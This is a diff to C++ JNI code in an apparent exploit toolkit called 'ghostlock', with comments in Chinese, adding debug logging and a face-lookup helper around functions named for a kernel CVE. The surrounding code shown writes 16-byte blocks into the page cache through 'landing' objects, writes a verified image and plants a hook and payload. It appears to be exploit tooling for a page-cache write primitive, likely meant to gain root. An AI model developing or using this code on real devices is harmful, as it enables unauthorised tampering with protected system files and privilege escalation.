@@ -226,6 +226,26 @@ namespace ghostlock::jni {
     /** Declared here; defined next to device_make_landing, where the surface table is in scope. */
     backend::cve_2026_43284::landing::PageCacheLanding *landing_of_door(std::uint64_t door_token) noexcept;
 
+    /**
+     *  一次 read/write 命中的那个面的**事实**：第几个面、门槽、载体 fd、是否远端（桥）。
+     *
+     *  @note 读写的日志只打它，不参与任何判断；定义放在面表之后（与 landing_of_door 同处），
+     *        所以这里先声明。
+     */
+    struct Face43284 final {
+        /** 命中与否；未命中时其余字段保持初值。 */
+        bool found = false;
+        /** 面号（1 起；0 = 未命中）。 */
+        std::size_t index = 0U;
+        /** 这个面服务的那扇门的槽（g_doors 的下标）。 */
+        std::size_t door_slot = 0U;
+        /** 载体 fd（远端载体为 -1：页由 patch #1 写下的 helper 送进管道）。 */
+        int file_fd = -1;
+        /** 载体是否远端（本进程打不开，走桥）。 */
+        bool remote = false;
+    };
+    Face43284 face_of_door(std::uint64_t door_token) noexcept;
+
     bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
                             const std::uint64_t door_token, std::uint64_t &sequence,
                             void *) noexcept {
@@ -237,20 +257,37 @@ namespace ghostlock::jni {
                     ((g_session != nullptr) && g_session->up) ? 1 : 0,
                     request.block.size(), static_cast<unsigned long long>(request.offset));
         }
+        const Face43284 face = face_of_door(door_token);
+        /* 命中的面与落点（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
+         *  —— 那边逐块 write16(ctx, offset, 16 字节)，偏移就是落点的事实；来源 fd 由窗口/表面层报）。 */
+        GL_LOGI("write_block face: token=0x%llx face=%zu found=%d door_slot=%zu file_fd=%d remote=%d offset=%llu len=%zu",
+                static_cast<unsigned long long>(door_token), face.index, face.found ? 1 : 0, face.door_slot,
+                face.file_fd, face.remote ? 1 : 0, static_cast<unsigned long long>(request.offset),
+                request.block.size());
         auto *const landing = landing_of_door(door_token);
         if (landing == nullptr || request.block.size() != 16U) {
+            GL_LOGI("write_block -> false no-landing=%d bytes=%zu", landing == nullptr ? 1 : 0,
+                    request.block.size());
             return false;
         }
         const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
         if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
+            GL_LOGI("write_block -> false slot=%zu fd=%d token=0x%llx", slot,
+                    slot < kMaxDoors ? g_doors[slot].fd : -1,
+                    static_cast<unsigned long long>(door_token));
             return false;
         }
         if (!landing->land_block(static_cast<std::uint64_t>(request.offset),
                                   request.block.data())) {
+            GL_LOGI("write_block -> false land_block refused offset=%llu face=%zu",
+                    static_cast<unsigned long long>(request.offset), face.index);
             return false;
         }
         sequence += 1U;
         landing->adopt_sequence(static_cast<std::uint32_t>(sequence));
+        GL_LOGI("write_block -> true sequence=%llu offset=%llu face=%zu",
+                static_cast<unsigned long long>(sequence),
+                static_cast<unsigned long long>(request.offset), face.index);
         return true;
     }
 
@@ -258,12 +295,22 @@ namespace ghostlock::jni {
                            const std::uint64_t door_token, const std::span<std::byte> out,
                            void *) noexcept {
         const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
+        const Face43284 face = face_of_door(door_token);
+        /* 命中的面与落点（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:252-262
+         *  —— 那边写完按同一 offset 读回一块再逐字节比较；读的就是落点上的内容）。 */
+        GL_LOGI("read_block face: token=0x%llx face=%zu found=%d door_slot=%zu file_fd=%d remote=%d offset=%llu len=%zu",
+                static_cast<unsigned long long>(door_token), face.index, face.found ? 1 : 0, face.door_slot,
+                face.file_fd, face.remote ? 1 : 0, static_cast<unsigned long long>(request.offset), out.size());
         if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
+            GL_LOGI("read_block -> false slot=%zu fd=%d token=0x%llx", slot,
+                    slot < kMaxDoors ? g_doors[slot].fd : -1,
+                    static_cast<unsigned long long>(door_token));
             return false;
         }
         /* Through the landing, like the write: pread sees the file, not the page cache the write went to. */
         auto *const landing = landing_of_door(door_token);
         if (landing == nullptr) {
+            GL_LOGI("read_block -> false no-landing offset=%llu", static_cast<unsigned long long>(request.offset));
             return false;
         }
         const bool ok = landing->read_block(static_cast<std::uint64_t>(request.offset),
@@ -698,6 +745,33 @@ namespace ghostlock::jni {
                 static_cast<unsigned long long>(door_token), want, kMaxSurfaces);
         return nullptr;
     }
+
+    /** 见前面的声明：把命中的那个面的 fd/远端事实交出来（读写的落点就是它）。 */
+    Face43284 face_of_door(const std::uint64_t door_token) noexcept {
+        Face43284 face{};
+        if (door_token == 0U) {
+            return face;
+        }
+        const std::uint64_t handle = (door_token >> 32U) != 0U ? (door_token >> 32U) : door_token;
+        if (handle == 0U) {
+            return face;
+        }
+        const std::size_t want = static_cast<std::size_t>(handle) - 1U;
+        for (std::size_t i = 0U; i < kMaxSurfaces; ++i) {
+            if (g_surfaces[i] == nullptr || g_landings[i] == nullptr) {
+                continue;
+            }
+            if (g_surfaces[i]->door_token == door_token || g_surfaces[i]->door_slot == want) {
+                face.found = true;
+                face.index = i + 1U;
+                face.door_slot = g_surfaces[i]->door_slot;
+                face.remote = g_surfaces[i]->target_remote;
+                face.file_fd = face.door_slot < kMaxDoors ? g_doors[face.door_slot].fd : -1;
+                break;
+            }
+        }
+        return face;
+    }
     std::uint64_t device_make_landing(const std::uint64_t surfaceId) noexcept {
         if (surfaceId == 0U) {
             return 0U;
@@ -788,9 +862,21 @@ namespace ghostlock::jni {
         }
         const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
         if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
+            GL_LOGI("land_block -> false landing=%llu slot=%zu",
+                    static_cast<unsigned long long>(landingId), slot);
             return false;
         }
-        return g_landings[slot]->land_block(offset, block);
+        /* 落地的写入口（成功历史：同 chain.cpp:242-250 —— 那边每块走 ops.write.write16）。 */
+        GL_LOGI("land_block enter: landing=%llu slot=%zu offset=%llu len=16 remote=%d file_fd=%d",
+                static_cast<unsigned long long>(landingId), slot,
+                static_cast<unsigned long long>(offset),
+                (slot < kMaxSurfaces && g_surfaces[slot] != nullptr) ? 1 : 0,
+                (slot < kMaxSurfaces && g_surfaces[slot] != nullptr &&
+                 g_surfaces[slot]->door_slot < kMaxDoors) ? g_doors[g_surfaces[slot]->door_slot].fd : -1);
+        const bool landed = g_landings[slot]->land_block(offset, block);
+        GL_LOGI("land_block -> %d offset=%llu slot=%zu", landed ? 1 : 0,
+                static_cast<unsigned long long>(offset), slot);
+        return landed;
     }
 
     /**
@@ -805,9 +891,22 @@ namespace ghostlock::jni {
         }
         const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
         if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
+            GL_LOGI("read_landing_block -> false landing=%llu slot=%zu",
+                    static_cast<unsigned long long>(landingId), slot);
             return false;
         }
-        return g_landings[slot]->read_block(offset, out);
+        /* 落地的读入口（成功历史：同 chain.cpp:252-262 —— 那边读回一块与写下的字节逐字节比较）。 */
+        GL_LOGI("read_landing_block enter: landing=%llu slot=%zu offset=%llu len=16 file_fd=%d",
+                static_cast<unsigned long long>(landingId), slot,
+                static_cast<unsigned long long>(offset),
+                (slot < kMaxSurfaces && g_surfaces[slot] != nullptr &&
+                 g_surfaces[slot]->door_slot < kMaxDoors) ? g_doors[g_surfaces[slot]->door_slot].fd : -1);
+        const bool got = g_landings[slot]->read_block(offset, out);
+        GL_LOGI("read_landing_block -> %d offset=%llu slot=%zu head=%02x%02x%02x%02x", got ? 1 : 0,
+                static_cast<unsigned long long>(offset), slot,
+                static_cast<unsigned>(out[0]), static_cast<unsigned>(out[1]),
+                static_cast<unsigned>(out[2]), static_cast<unsigned>(out[3]));
+        return got;
     }
 
     /** Access 表：按拼接面/落地对象建出来的 Access 在这里按不透明 id 存着（谁建谁拆）。 */
@@ -1029,6 +1128,19 @@ namespace ghostlock::jni {
                 static_cast<unsigned>(access_params.sa.encap_port),
                 static_cast<unsigned>(access_params.sa.sender_port),
                 static_cast<unsigned>(access_params.sa.icv_len));
+        /* 命中的面（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
+         *  —— 那边写镜像的每一块都落在这个 access 借用的 landing 上；面 = access → landing → surface）。 */
+        {
+            const std::size_t landing_slot_now = (slot < kMaxAccesses) ? g_access_landing[slot] : 0U;
+            const Surface *const surface_now =
+                (landing_slot_now != 0U && landing_slot_now - 1U < kMaxSurfaces)
+                    ? g_surfaces[landing_slot_now - 1U].get() : nullptr;
+            GL_LOGI("write_image face: access_slot=%zu landing_slot=%zu remote=%d door_slot=%zu file_fd=%d",
+                    slot, landing_slot_now, (surface_now != nullptr && surface_now->target_remote) ? 1 : 0,
+                    surface_now != nullptr ? surface_now->door_slot : 0U,
+                    (surface_now != nullptr && surface_now->door_slot < kMaxDoors)
+                        ? g_doors[surface_now->door_slot].fd : -1);
+        }
         const char *refusal = nullptr;
         const bool wrote = backend::cve_2026_43284::steps::write_image_verified(request, &refusal);
         GL_LOGI("write_image verified=%d refusal=%s", wrote ? 1 : 0, refusal != nullptr ? refusal : "(null)");
@@ -1052,6 +1164,8 @@ namespace ghostlock::jni {
                 *why = "land:dispatched-unverified";
             }
         }
+        GL_LOGI("write_image -> %d why=%s", wrote ? 1 : 0,
+                (why != nullptr && *why != nullptr) ? *why : "(null)");
         return wrote;
     }
 
@@ -1111,6 +1225,22 @@ namespace ghostlock::jni {
         request.params = &access_params;
         request.plan = &plan;
         request.width = static_cast<std::uint64_t>(values.hookWidth);
+        /* 命中的面（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/real_ops.cpp:303-325
+         *  —— 那边钩子块写接续载体窗口的序号，经 plan_hook_patch + apply_hook_patch 写站点与载荷；
+         *  面 = access → landing → surface，落点就是它）。 */
+        {
+            const std::size_t landing_slot_now = (slot < kMaxAccesses) ? g_access_landing[slot] : 0U;
+            const Surface *const surface_now =
+                (landing_slot_now != 0U && landing_slot_now - 1U < kMaxSurfaces)
+                    ? g_surfaces[landing_slot_now - 1U].get() : nullptr;
+            GL_LOGI("hook write face: access=%llu slot=%zu landing_slot=%zu remote=%d door_slot=%zu file_fd=%d width=%llu",
+                    static_cast<unsigned long long>(access_id), slot, landing_slot_now,
+                    (surface_now != nullptr && surface_now->target_remote) ? 1 : 0,
+                    surface_now != nullptr ? surface_now->door_slot : 0U,
+                    (surface_now != nullptr && surface_now->door_slot < kMaxDoors)
+                        ? g_doors[surface_now->door_slot].fd : -1,
+                    static_cast<unsigned long long>(values.hookWidth));
+        }
         const char *refusal = nullptr;
         const bool hook_wrote = backend::cve_2026_43284::steps::write_hook(request, &refusal);
         GL_LOGI("hook: map hook_vaddr=0x%llx hook_file=0x%llx payload_vaddr=0x%llx payload_file=0x%llx",
@@ -1128,6 +1258,8 @@ namespace ghostlock::jni {
         GL_LOGI("hook: write_hook wrote=%d refusal=%s plan=%p width=%llu", hook_wrote ? 1 : 0,
                 refusal != nullptr ? refusal : "(null)", static_cast<const void *>(request.plan),
                 static_cast<unsigned long long>(request.width));
+        GL_LOGI("hook write -> %d refusal=%s", hook_wrote ? 1 : 0,
+                refusal != nullptr ? refusal : "(null)");
         return hook_wrote;
     }
 
